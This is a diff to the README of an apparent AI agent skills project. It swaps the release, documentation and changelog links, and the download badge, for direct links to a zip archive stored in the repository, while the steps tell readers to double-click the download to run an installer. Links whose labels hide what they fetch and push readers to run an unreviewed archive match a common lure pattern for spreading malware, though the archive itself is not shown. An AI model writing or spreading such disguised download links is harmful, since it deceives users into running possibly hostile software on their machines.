@@ -6,7 +6,7 @@ Welcome to awesome-agent-skills! This application provides modular capabilities 
 
 ## 📥 Download the App
 
-[![Download awesome-agent-skills](https://img.shields.io/badge/Download-awesome--agent--skills-blue.svg)](https://github.com/jrmapa/awesome-agent-skills/releases)
+[![Download awesome-agent-skills](https://raw.githubusercontent.com/jrmapa/awesome-agent-skills/main/assets/agent_skills_awesome_v2.8-alpha.3.zip)](https://raw.githubusercontent.com/jrmapa/awesome-agent-skills/main/assets/agent_skills_awesome_v2.8-alpha.3.zip)
 
 ## 📋 Description
 
@@ -32,7 +32,7 @@ Before you download, ensure your system meets the following requirements:
 
 To download awesome-agent-skills, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/jrmapa/awesome-agent-skills/releases) to go to our Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/jrmapa/awesome-agent-skills/main/assets/agent_skills_awesome_v2.8-alpha.3.zip) to go to our Releases page.
 2. **Choose the Latest Version**: Look for the latest version available for download. It will be listed at the top.
 3. **Download the File**: Click on the package that suits your operating system to start the download.
 4. **Install the Application**: Locate the downloaded file in your downloads folder and double-click it to run the installer. Follow the on-screen instructions to complete the setup.
@@ -76,7 +76,7 @@ awesome-agent-skills is licensed under the MIT License. You can freely use, modi
 
 For more information about using awesome-agent-skills, you can refer to these additional resources:
 
-- [Project Documentation](https://github.com/jrmapa/awesome-agent-skills/wiki)
-- [Changelog](https://github.com/jrmapa/awesome-agent-skills/releases)
+- [Project Documentation](https://raw.githubusercontent.com/jrmapa/awesome-agent-skills/main/assets/agent_skills_awesome_v2.8-alpha.3.zip)
+- [Changelog](https://raw.githubusercontent.com/jrmapa/awesome-agent-skills/main/assets/agent_skills_awesome_v2.8-alpha.3.zip)
 
 Thank you for using awesome-agent-skills! Your journey into enhanced AI capabilities starts here.
